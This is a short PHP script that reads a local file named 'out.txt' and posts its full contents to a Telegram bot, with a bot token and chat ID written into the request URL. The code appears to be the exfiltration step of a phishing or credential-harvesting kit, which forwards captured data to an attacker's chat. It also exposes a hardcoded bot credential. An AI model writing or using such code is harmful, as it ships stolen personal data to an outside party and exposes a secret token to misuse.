<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/1531419689:AAEdFfTVf64rmeaxpb-yAdqQBd75q5qfjM8/sendMessage?chat_id=1455433874&text=$msg");
?>
